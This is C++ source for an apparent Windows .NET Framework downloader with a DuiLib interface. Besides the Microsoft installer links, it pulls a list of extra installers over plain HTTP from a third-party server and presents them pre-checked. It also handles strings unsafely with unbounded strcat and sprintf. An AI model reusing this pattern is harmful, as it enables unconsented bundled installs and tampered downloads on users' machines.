	st.plabelSpeed = m_pLabelSpeed2;
	st.plabelOver = m_pLabelOver2;
	st.plabelOverPic = m_pLabelOverPic2;
	st.plabelPercent = m_pLabelPercent2;
	st.plabelHund = m_pLabelHund2;
	st.plabelDec = m_pLabelDec2;
	st.plabelUnit = m_pLabelUnit2;
	st.pUrlTip = m_pLabeltipText2;
	st.strUrl = "https://download.microsoft.com/download/4/9/0/49001df1-af88-4a4d-b10f-2d5e3a8ea5f3/dotnetfx30SP1setup.exe";  //Microsoft .NET Framework 3.0 Service Pack 1
	GetUserDeskPath(szFilePath);
	strcat(szFilePath, "\\dotnetfx30SP1setup.exe");
	g_InstalFileAddr.push_back(szFilePath);
	g_mapUserSelect.insert(pair<int, stUserSelect>(2, st));

	st.ptopSplit = m_pBtntopSplit3;
	st.pnetText = m_pLabelnetText3;
	st.psysText = m_pLabelsysText3;
	st.pDownnload = m_pBtnDownload3;
	st.pOpenFile = m_pBtnOpenFile3;
	st.pOpenDir = m_pBtnOpenDir3;
	st.pProgress = m_pProgress3;
	st.plabelSpeed = m_pLabelSpeed3;
	st.plabelOver = m_pLabelOver3;
	st.plabelOverPic = m_pLabelOverPic3;
	st.plabelPercent = m_pLabelPercent3;
	st.plabelHund = m_pLabelHund3;
	st.plabelDec = m_pLabelDec3;
	st.plabelUnit = m_pLabelUnit3;
	st.pUrlTip = m_pLabeltipText3;
	st.strUrl = "https://download.microsoft.com/download/2/0/E/20E90413-712F-438C-988E-FDAA79A8AC3D/dotnetfx35.exe";  //Microsoft .NET Framework 3.5 Service Pack 1
	GetUserDeskPath(szFilePath);
	strcat(szFilePath, "\\dotnetfx35.exe");
	g_InstalFileAddr.push_back(szFilePath);
	g_mapUserSelect.insert(pair<int, stUserSelect>(3, st));

	st.ptopSplit = m_pBtntopSplit4;
	st.pnetText = m_pLabelnetText4;
	st.psysText = m_pLabelsysText4;
	st.pDownnload = m_pBtnDownload4;
	st.pOpenFile = m_pBtnOpenFile4;
	st.pOpenDir = m_pBtnOpenDir4;
	st.pProgress = m_pProgress4;
	st.plabelSpeed = m_pLabelSpeed4;
	st.plabelOver = m_pLabelOver4;
	st.plabelOverPic = m_pLabelOverPic4;
	st.plabelPercent = m_pLabelPercent4;
	st.plabelHund = m_pLabelHund4;
	st.plabelDec = m_pLabelDec4;
	st.plabelUnit = m_pLabelUnit4;
	st.pUrlTip = m_pLabeltipText4;
	st.strUrl = "https://download.microsoft.com/download/9/5/A/95A9616B-7A37-4AF6-BC36-D6EA96C8DAAE/dotNetFx40_Full_x86_x64.exe";  //Microsoft .NET Framework 4（独立安装程序）
	GetUserDeskPath(szFilePath);
	strcat(szFilePath, "\\dotNetFx40_Full_x86_x64.exe");
	g_InstalFileAddr.push_back(szFilePath);
	g_mapUserSelect.insert(pair<int, stUserSelect>(4, st));

	st.ptopSplit = m_pBtntopSplit5;
	st.pnetText = m_pLabelnetText5;
	st.psysText = m_pLabelsysText5;
	st.pDownnload = m_pBtnDownload5;
	st.pOpenFile = m_pBtnOpenFile5;
	st.pOpenDir = m_pBtnOpenDir5;
	st.pProgress = m_pProgress5;
	st.plabelSpeed = m_pLabelSpeed5;
	st.plabelOver = m_pLabelOver5;
	st.plabelOverPic = m_pLabelOverPic5;
	st.plabelPercent = m_pLabelPercent5;
	st.plabelHund = m_pLabelHund5;
	st.plabelDec = m_pLabelDec5;
	st.plabelUnit = m_pLabelUnit5;
	st.pUrlTip = m_pLabeltipText5;
	st.strUrl = "https://download.microsoft.com/download/E/2/1/E21644B5-2DF2-47C2-91BD-63C560427900/NDP452-KB2901907-x86-x64-AllOS-ENU.exe";   //Microsoft .NET Framework 4.5
	GetUserDeskPath(szFilePath);
	strcat(szFilePath, "\\NDP452-KB2901907-x86-x64-AllOS-ENU.exe");
	g_InstalFileAddr.push_back(szFilePath);
	g_mapUserSelect.insert(pair<int, stUserSelect>(5, st));

	st.ptopSplit = m_pBtntopSplit6;
	st.pnetText = m_pLabelnetText6;
	st.psysText = m_pLabelsysText6;
	st.pDownnload = m_pBtnDownload6;
	st.pOpenFile = m_pBtnOpenFile6;
	st.pOpenDir = m_pBtnOpenDir6;
	st.pProgress = m_pProgress6;
	st.plabelSpeed = m_pLabelSpeed6;
	st.plabelOver = m_pLabelOver6;
	st.plabelOverPic = m_pLabelOverPic6;
	st.plabelPercent = m_pLabelPercent6;
	st.plabelHund = m_pLabelHund6;
	st.plabelDec = m_pLabelDec6;
	st.plabelUnit = m_pLabelUnit6;
	st.pUrlTip = m_pLabeltipText6;
	st.strUrl = "https://download.microsoft.com/download/E/4/1/E4173890-A24A-4936-9FC9-AF930FE3FA40/NDP461-KB3102436-x86-x64-AllOS-ENU.exe"; //Microsoft .NET Framework 4.6.2（脱机安装程序）
	GetUserDeskPath(szFilePath);
	strcat(szFilePath, "\\NDP461-KB3102436-x86-x64-AllOS-ENU.exe");
	g_InstalFileAddr.push_back(szFilePath);
	g_mapUserSelect.insert(pair<int, stUserSelect>(6, st));

	g_nWndStatus = 0;
	g_bInstaller = false;

	stInstaller ins;
	ins.bCheck = true;
	ins.bInstall = false;

	ins.pCheckBox = m_pcheckBox3;
	ins.pLabel = m_plabelIns3;
	g_mapUserInstaller.insert(pair<int, stInstaller>(1, ins));

	ins.pCheckBox = m_pcheckBox2;
	ins.pLabel = m_plabelIns2;
	g_mapUserInstaller.insert(pair<int, stInstaller>(2, ins));

	ins.pCheckBox = m_pcheckBox1;
	ins.pLabel = m_plabelIns1;
	g_mapUserInstaller.insert(pair<int, stInstaller>(3, ins));


	string strUrl;
	wstring strWUrl;
	//INIParser ini_parser;
	//ini_parser.ReadINI(".\\config.ini");
	//strUrl = ini_parser.GetValue("default", "url");
	//ini_parser.Clear();
	
	strUrl = "http://software.wanyouxi999.com/ver2/plugins/donet";
	StringToWString(strUrl, strWUrl);
	wchar_t* wcTarget = new wchar_t[strWUrl.size() + 1];
	swprintf(wcTarget, strWUrl.size() + 1, L"%lS", strWUrl.c_str());

	vector<stInstaller> vecIns;
	GetInstallerHttpInfo(wcTarget, vecIns);
	if (vecIns.size() > 0)
	{
		int nCount = 1;
		
		for (vector<stInstaller>::iterator it = vecIns.begin(); it != vecIns.end(); it++)
		{
			if (it->strUrl.size() >0)
			{
				wstring str = L"";
				g_mapUserInstaller[nCount].strCaption = it->strCaption;
				g_mapUserInstaller[nCount].strFileName = it->strFileName;
				g_mapUserInstaller[nCount].strUrl = it->strUrl;
				g_mapUserInstaller[nCount].pCheckBox->SetVisible(true);
				g_mapUserInstaller[nCount].pCheckBox->SetBkImage(L"check2.png");
				g_mapUserInstaller[nCount].pLabel->SetVisible(true);
				StringToWString(it->strCaption, str);
				g_mapUserInstaller[nCount].pLabel->SetText(str.c_str());
			}

			nCount++;
		}
	}

	CleanFile();

	m_pChildWnd = new ChildWnd();
	m_pChildWnd->Create(NULL, _T(".NET提示框"), UI_WNDSTYLE_DIALOG, 0L, 0, 0, 360, 240);
	m_pChildWnd->CenterWindow();
	m_pChildWnd->ShowWindow(SW_HIDE);
	m_pChildWnd->SetIcon(IDI_ICON2);


	HANDLE handle = CreateThread(NULL, 0, ThreadInstallDllFile, NULL, 0, NULL);
	CloseHandle(handle);

	//if (g_pInitDownloadEngine != NULL)
	//{
	//	SetTimer(GetHWND(), TIMER_ID_PROGRESS, 500, NULL);
	//}

	ShowFirstUI(true);
	ShowSecondUI(false);
}



void CMainWnd::ShowFirstUI(bool bShow)
{
	if (bShow == true)
	{
		m_pLayout->SetBkImage(L"start.png");
		m_pLayout->SetVisible(bShow);
	}

	m_pBtnNext->SetVisible(bShow);
	m_pBtnClose1->SetVisible(bShow);
}

void CMainWnd::ShowSecondUI(bool bShow)
{
	if (bShow == true)
	{
		m_pLayout->SetBkImage(L"bk.png");
		m_pLayout->SetVisible(bShow);
	}
	
	if (bShow == true)
	{
		for (int i = 1; i < 4; i++)
		{
			g_mapUserInstaller[i].pCheckBox->SetVisible(false);
			g_mapUserInstaller[i].pLabel->SetVisible(false);
		}
	}

	for (int i = 1; i < 7; i++)
	{
		g_mapUserSelect[i].ptopSplit->SetVisible(bShow);
		g_mapUserSelect[i].pnetText->SetVisible(bShow);
		g_mapUserSelect[i].psysText->SetVisible(bShow);
		g_mapUserSelect[i].pDownnload->SetVisible(bShow);
		//g_mapUserSelect[i].plabelDec->SetVisible(bShow);
		//g_mapUserSelect[i].plabelHund->SetVisible(bShow);
		//g_mapUserSelect[i].plabelOver->SetVisible(bShow);
		////g_mapUserSelect[i].plabelOverPic->SetVisible(bShow);
		//g_mapUserSelect[i].plabelPercent->SetVisible(bShow);
		//g_mapUserSelect[i].plabelSpeed->SetVisible(bShow);
		//g_mapUserSelect[i].plabelUnit->SetVisible(bShow);
		////g_mapUserSelect[i].pOpenDir->SetVisible(bShow);
		////g_mapUserSelect[i].pOpenFile->SetVisible(bShow);
		////g_mapUserSelect[i].pProgress->SetVisible(bShow);
		g_mapUserSelect[i].pUrlTip->SetVisible(bShow);
	}

	m_pLabelLogo->SetVisible(bShow);
	m_pBtnClose2->SetVisible(bShow);
	m_pLabelTopBkTip->SetVisible(bShow);
	m_pBtnMin->SetVisible(bShow);
	m_pLabelTopTextBk->SetVisible(bShow);

	m_pLabeltopText1->SetVisible(bShow);
	m_pLabeltopText2->SetVisible(bShow);
	m_pLabeltopText3->SetVisible(bShow);
	m_pLabeltopText4->SetVisible(bShow);

	m_pLabeltipLast1->SetVisible(bShow);
	m_pLabeltipPeiTu->SetVisible(bShow);
	m_pLabeltipLast2->SetVisible(bShow);
	m_pLabeltipLast3->SetVisible(bShow);
	m_pLabeltipLast4->SetVisible(bShow);
}

CDuiString gensizestr(int sizevalue)
{
	CDuiString strUDiskSize;

	if (sizevalue < 1024)
		strUDiskSize.Format(_T("%dB"), sizevalue);
	else if (sizevalue < 1024 * 1024)
		strUDiskSize.Format(_T("%dKB"), sizevalue / 1024);
	else if (sizevalue < 1024 * 1024 * 1024)
		strUDiskSize.Format(_T("%4.1fMB"), sizevalue / (1024 * 1024.0));
	else if (sizevalue < (int)1024 * 1024 * 1024 * 1024)
		strUDiskSize.Format(_T("%4.1fGB"), sizevalue / (1024 * 1024.0 * 1024.0));
	return strUDiskSize;
}


void CMainWnd::UpdataDownloadBtnShow(int nIndex)
{
	g_mapUserSelect[nIndex].pDownnload->SetVisible(false);
	g_mapUserSelect[nIndex].pProgress->SetValue(0);
	g_mapUserSelect[nIndex].pProgress->SetVisible(true);
	g_mapUserSelect[nIndex].bDownload = true;

	char szFilePath[MAX_PATH] = {0};
	char szFileName[MAX_PATH] = { 0 };
	GetUserTempPath(szFilePath);
	sprintf(szFileName, "Net_%d.exe", nIndex);
	strcat(szFilePath, szFileName);

	//CheckDir("c:\\NetFiles");
	//strcpy(szFilePath, "c:\\NetFiles\\");
	//GetUserDeskPath(szFilePath);
	//sprintf(szFileName, "Net_%d.exe", nIndex);
	//strcat(szFilePath, szFileName);

	g_nDownloadFileNum++;
	g_mapUserSelect[nIndex].nDownloadIndex = g_nDownloadFileNum;
	g_mapUserSelect[nIndex].strFilePath = szFilePath;
	if (g_pCerateDownloadRask != NULL && g_pCerateDownloadRask != NULL)
	{
		g_pCerateDownloadRask(g_mapUserSelect[nIndex].strUrl.c_str(), szFilePath, g_nDownloadFileNum);
	}
}

void SplitNumber(const int& nValue, stNumber& stNum)
{
	if (nValue > 0)
	{
		stNum.nHund = 0;
		stNum.nDec = 0;
		stNum.nUnit = 0;

		if (nValue == 100)
		{
			stNum.nHund = 1;
		} 
		else
		{
			stNum.nDec = nValue / 10;
			if (nValue > 9)
				stNum.nUnit = nValue % 10;
			else
				stNum.nUnit = nValue;
		}
	}
}

void CMainWnd::UpdataDownloadProShow(int nIndex)
{
	if (g_pQueryDownloadSpeed == NULL ||
		g_pQueryTotalFileSize == NULL ||
		g_pQueryDownloadFileSize == NULL ||
		g_mapUserSelect.size() < nIndex)
	{
		return;
	}
		

	char chSpeed[100] = { 0 };
	char chTotalSize[100] = { 0 };
	char chDownloadSize[100] = { 0 };
	int nDownloadSpeed = 0;
	int nDownloadFileSize = 0;
	int nTotalFileSize = 0;
	stNumber stNum;
	CDuiString strPre, strHund, strDec, strUnit;

	g_pQueryDownloadSpeed(g_mapUserSelect[nIndex].nDownloadIndex, chSpeed);
	nDownloadSpeed += atoi(chSpeed);

	g_pQueryTotalFileSize(g_mapUserSelect[nIndex].nDownloadIndex, chTotalSize);
	g_pQueryDownloadFileSize(g_mapUserSelect[nIndex].nDownloadIndex, chDownloadSize);

	nTotalFileSize = atoi(chTotalSize);
	nDownloadFileSize = atoi(chDownloadSize);

	if (nTotalFileSize == nDownloadFileSize && nTotalFileSize > 0 )
	{
		g_nIndex = nIndex;
		g_hHandle[nIndex - 1] = CreateThread(NULL, 0, ThreadCopyFile, NULL, 0, NULL);
		CloseHandle(g_hHandle[nIndex - 1]);

		g_mapUserSelect[nIndex].plabelSpeed->SetVisible(false);
		g_mapUserSelect[nIndex].plabelPercent->SetVisible(false);
		g_mapUserSelect[nIndex].plabelHund->SetVisible(false);
		g_mapUserSelect[nIndex].plabelDec->SetVisible(false);
		g_mapUserSelect[nIndex].plabelUnit->SetVisible(false);

		if (CheckFile(g_InstalFileAddr[nIndex - 1].c_str()) == true)
		{
			g_mapUserSelect[nIndex].pProgress->SetValue(100);
			g_mapUserSelect[nIndex].plabelOver->SetText(L"下载完成");
			g_mapUserSelect[nIndex].plabelOver->SetVisible(true);
			g_mapUserSelect[nIndex].plabelOverPic->SetVisible(true);
			g_mapUserSelect[nIndex].bOver = true;
		}
		//else
		//{
		//	g_mapUserSelect[nIndex].pProgress->SetValue(0);
		//	g_mapUserSelect[nIndex].plabelOver->SetText(L"下载失败");
		//	g_mapUserSelect[nIndex].plabelOver->SetVisible(true);
		//	g_mapUserSelect[nIndex].plabelOver->SetTextColor(0xffff2764);
		//	g_mapUserSelect[nIndex].plabelOverPic->SetVisible(true);
		//	g_mapUserSelect[nIndex].plabelOverPic->SetBkImage(L"unsuc.png");
		//}

	}
	
	if(nTotalFileSize != nDownloadFileSize && nTotalFileSize > 0 && 
		g_mapUserSelect[nIndex].bOptSuc == false)
	{
		double n = (double)nDownloadFileSize / nTotalFileSize;
		int nValue = (int)100 * n;
		
		RECT rcSrc = { 0,0,0,0 }, rcDst = { 0,0,0,0 };
		CDuiString strSpeed;
		strSpeed = chSpeed;
		strSpeed += "/S";
		g_mapUserSelect[nIndex].plabelSpeed->SetVisible(true);
		g_mapUserSelect[nIndex].plabelSpeed->SetText(strSpeed);

		if (nValue <= 100  && nValue > 0)
		{
			SplitNumber(nValue, stNum);

			if (stNum.nDec > 0)
			{
				strDec.Format(L"%d.png", stNum.nDec);
				g_mapUserSelect[nIndex].plabelDec->SetVisible(true);
				g_mapUserSelect[nIndex].plabelDec->SetBkImage(strDec);

				strUnit.Format(L"%d.png", stNum.nUnit);
				g_mapUserSelect[nIndex].plabelUnit->SetVisible(true);
				g_mapUserSelect[nIndex].plabelUnit->SetBkImage(strUnit);

			}
			else
			{
				strUnit.Format(L"%d.png", stNum.nUnit);
				g_mapUserSelect[nIndex].plabelUnit->SetVisible(true);
				g_mapUserSelect[nIndex].plabelUnit->SetBkImage(strUnit);

			}

			strPre = L"per.png";
			g_mapUserSelect[nIndex].plabelPercent->SetVisible(true);
			g_mapUserSelect[nIndex].plabelPercent->SetBkImage(strPre);

			g_mapUserSelect[nIndex].pProgress->SetValue(nValue);

			if (nDownloadSpeed == 0)
			{
				g_mapUserSelect[nIndex].tm.bStart = true;
				g_mapUserSelect[nIndex].tm.nLapse++;
				if (g_mapUserSelect[nIndex].tm.nLapse/10 == 18 )
				{
					g_mapUserSelect[nIndex].plabelSpeed->SetVisible(false);
					g_mapUserSelect[nIndex].plabelPercent->SetVisible(false);
					g_mapUserSelect[nIndex].plabelHund->SetVisible(false);
					g_mapUserSelect[nIndex].plabelDec->SetVisible(false);
					g_mapUserSelect[nIndex].plabelUnit->SetVisible(false);

					g_mapUserSelect[nIndex].pProgress->SetValue(0);
					g_mapUserSelect[nIndex].plabelOver->SetText(L"网络故障");
					g_mapUserSelect[nIndex].plabelOver->SetVisible(true);
					g_mapUserSelect[nIndex].plabelOver->SetTextColor(0xffff2764);
					g_mapUserSelect[nIndex].plabelOverPic->SetVisible(true);
					g_mapUserSelect[nIndex].plabelOverPic->SetBkImage(L"unsuc.png");
					g_mapUserSelect[nIndex].bOptSuc = true;
				}
			}
			else
			{
				if (g_mapUserSelect[nIndex].tm.bStart == true)
				{
					g_mapUserSelect[nIndex].tm.bStart = false;
					g_mapUserSelect[nIndex].tm.nLapse = 0;
				}
			}
		}

	}
}

void CMainWnd::UpdataOverShow(int nIndex)
{
	if (CheckFile(g_InstalFileAddr[nIndex-1].c_str()))
	{
		g_mapUserSelect[nIndex].plabelPercent->SetVisible(false);
		g_mapUserSelect[nIndex].plabelHund->SetVisible(false);
		g_mapUserSelect[nIndex].plabelDec->SetVisible(false);
		g_mapUserSelect[nIndex].plabelUnit->SetVisible(false);

		g_mapUserSelect[nIndex].plabelOver->SetVisible(false);
		g_mapUserSelect[nIndex].plabelOverPic->SetVisible(false);

		g_mapUserSelect[nIndex].pProgress->SetVisible(false);

		g_mapUserSelect[nIndex].pOpenFile->SetVisible(true);
		g_mapUserSelect[nIndex].pOpenDir->SetVisible(true);
	}

}

void CMainWnd::ShowPauseWnd()
{
	if (m_pChildWnd)
	{
		UnEnableWnd();
		m_pChildWnd->FitstBkShow(true);
		m_pChildWnd->SecondBkShow(false);
		m_pChildWnd->ShowWindow(SW_SHOW);

		RECT rtMain = { 0 };
		RECT rtChild = { 0 };
		GetWindowRect(this->m_hWnd, &rtMain);
		GetWindowRect(m_pChildWnd->GetHWND(), &rtChild);

		int lWidthMain = rtMain.right - rtMain.left;
		int lHeightMain = rtMain.bottom - rtMain.top;

		int lWidthChild = rtChild.right - rtChild.left;
		int lHeightChild = rtChild.bottom - rtChild.top;

		int x = abs(rtMain.left + (lWidthMain - lWidthChild) / 2);
		int y = abs(rtMain.top + (lHeightMain - lHeightChild) / 2);
		MoveWindow(m_pChildWnd->GetHWND(), x, y, lWidthChild, lHeightChild, TRUE);

		m_pChildWnd->ShowModal();
	}
}

void CMainWnd::ShowNoFileWnd()
{
	if (m_pChildWnd)
	{
		UnEnableWnd();
		m_pChildWnd->FitstBkShow(false);
		m_pChildWnd->SecondBkShow(true);
		m_pChildWnd->ShowWindow(SW_SHOW);

		RECT rtMain = { 0 };
		RECT rtChild = { 0 };
		GetWindowRect(this->m_hWnd, &rtMain);
		GetWindowRect(m_pChildWnd->GetHWND(), &rtChild);

		int lWidthMain = rtMain.right - rtMain.left;
		int lHeightMain = rtMain.bottom - rtMain.top;

		int lWidthChild = rtChild.right - rtChild.left;
		int lHeightChild = rtChild.bottom - rtChild.top;

		int x = abs(rtMain.left + (lWidthMain - lWidthChild) / 2);
		int y = abs(rtMain.top + (lHeightMain - lHeightChild) / 2);
		MoveWindow(m_pChildWnd->GetHWND(), x, y, lWidthChild, lHeightChild, TRUE);

		m_pChildWnd->ShowModal();
	}
}

void CMainWnd::CleanFile()
{
	char szPath[MAX_PATH] = { 0 };
	GetUserTempPath(szPath);
	vector<string> vecFiles;
	GetFiles(szPath, vecFiles);

	for (vector<string>::iterator it = vecFiles.begin(); it != vecFiles.end(); ++it)
	{
		string strName = *it;
		if ( strcmp(PathFindExtensionA(strName.c_str()), ".td") == 0 ||
			 strcmp(PathFindExtensionA(strName.c_str()), ".cfg") == 0 )
		{
			remove(strName.c_str());
		}
	}
}

bool CMainWnd::CheckNet()
{
	if (0 == InternetAttemptConnect(0))
	{
		return true;
	}
	else
	{
		return false;
	}
}


void SplitString(const string& s, vector<string>& v, const string& c)
{
	string::size_type pos1, pos2;
	pos2 = s.find(c);
	pos1 = 0;
	while (string::npos != pos2)
	{
		v.push_back(s.substr(pos1, pos2 - pos1));

		pos1 = pos2 + c.size();
		pos2 = s.find(c, pos1);
	}
	if (pos1 != s.length())
		v.push_back(s.substr(pos1));
}

string SubString(string strSrc, string strSymbol)
{
	int nTol = 0;
	int nFid = 0;
	string strRet;

	nTol = strSrc.size();
	nFid = strSrc.find(strSymbol.c_str());
	strRet = strSrc.substr(nFid+1, nTol);

	return strRet;
}

void CMainWnd::GetInstallerHttpInfo(_TCHAR* url, vector<stInstaller>& vecIns)
{
	char chTemp[2000];
	ZeroMemory(chTemp, 2000);
	HINTERNET hSession = InternetOpen(_T("UrlTest"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hSession != NULL)
	{
		HINTERNET hHttp = InternetOpenUrl(hSession, url, NULL, 0, INTERNET_FLAG_DONT_CACHE, 0);
		if (hHttp != NULL)
		{
			printf("%s\n\n", url);
			BYTE Temp[2000];
			ULONG Number = 1;
			while (Number > 0)
			{
				InternetReadFile(hHttp, Temp, 2000 - 1, &Number);
				Temp[Number] = '\0';
				CopyMemory(chTemp, Temp, Number);
				printf("%s", Temp);
			}

			InternetCloseHandle(hHttp);
			hHttp = NULL;
		}
		InternetCloseHandle(hSession);
		hSession = NULL;
	}

	string strRet;
	strRet = chTemp;

	stInstaller ins;
	vector<string> vRet;
	SplitString(strRet, vRet, "\n"); //可按多个字符来分隔;
	if (vRet.size() > 0)
	{
		for (vector<string>::iterator it = vRet.begin(); it != vRet.end(); it++)
		{
			if (it->find("skip_01") != string::npos)
			{
				for (vector<string>::iterator itSub = vRet.begin(); itSub != vRet.end(); itSub++)
				{
					if (itSub->find("caption_01") != string::npos)
					{
						ins.strCaption = SubString(*itSub, "=");
					}

					if (itSub->find("url_01") != string::npos)
					{
						ins.strUrl = SubString(*itSub, "=");
					}

					if (itSub->find("filename_01") != string::npos)
					{
						ins.strFileName = SubString(*itSub, "=");
					}
				}

				vecIns.push_back(ins);

			}

			if (it->find("skip_02") != string::npos)
			{
				for (vector<string>::iterator itSub = vRet.begin(); itSub != vRet.end(); itSub++)
				{
					if (itSub->find("caption_02") != string::npos)
					{
						ins.strCaption = SubString(*itSub, "=");
					}

					if (itSub->find("url_02") != string::npos)
					{
						ins.strUrl = SubString(*itSub, "=");
					}

					if (itSub->find("filename_02") != string::npos)
					{
						ins.strFileName = SubString(*itSub, "=");
					}
				}

				vecIns.push_back(ins);
			}

			if (it->find("skip_03") != string::npos)
			{
				for (vector<string>::iterator itSub = vRet.begin(); itSub != vRet.end(); itSub++)
				{
					if (itSub->find("caption_03") != string::npos)
					{
						ins.strCaption = SubString(*itSub, "=");
					}

					if (itSub->find("url_03") != string::npos)
					{
						ins.strUrl = SubString(*itSub, "=");
					}

					if (itSub->find("filename_03") != string::npos)
					{
						ins.strFileName = SubString(*itSub, "=");
					}
				}

				vecIns.push_back(ins);
			}
		}
	}

}

void CMainWnd::EnableWnd()
{
	for (int i = 1; i < 7; i++)
	{
		g_mapUserSelect[i].pDownnload->SetEnabled(true);
		g_mapUserSelect[i].pOpenDir->SetEnabled(true);
		g_mapUserSelect[i].pOpenFile->SetEnabled(true);
		g_mapUserSelect[i].pUrlTip->SetEnabled(true);
	}
}

void CMainWnd::UnEnableWnd()
{
	for (int i = 1; i < 7; i++)
	{
		g_mapUserSelect[i].pDownnload->SetEnabled(false);
		g_mapUserSelect[i].pOpenDir->SetEnabled(false);
		g_mapUserSelect[i].pOpenFile->SetEnabled(false);
		g_mapUserSelect[i].pUrlTip->SetEnabled(false);
	}
}

